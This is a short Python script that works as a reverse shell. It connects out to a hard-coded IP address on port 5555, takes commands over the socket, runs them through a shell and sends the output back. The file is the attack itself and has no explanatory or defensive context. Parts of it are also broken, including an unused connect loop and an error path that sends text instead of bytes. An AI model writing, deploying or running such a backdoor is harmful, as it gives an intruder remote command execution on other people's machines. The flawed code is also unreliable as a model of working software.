import socket
import subprocess
import time


def execute_command(command):
    return subprocess.check_output(command, shell=True)


def receive_commands(target):
    while True:
        try:
            receive = target.recv(1024).decode()
            execute = execute_command(command=receive).decode()
            target.send(f"{execute}".encode())
        except Exception:
            print("perror")
            target.send("We encountered an error.")


def connection():
    while True:
        server.connect(('192.168.141.86', 5555))


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(('192.168.141.86', 5555))

receive_commands(server)
# close the connection
server.close()
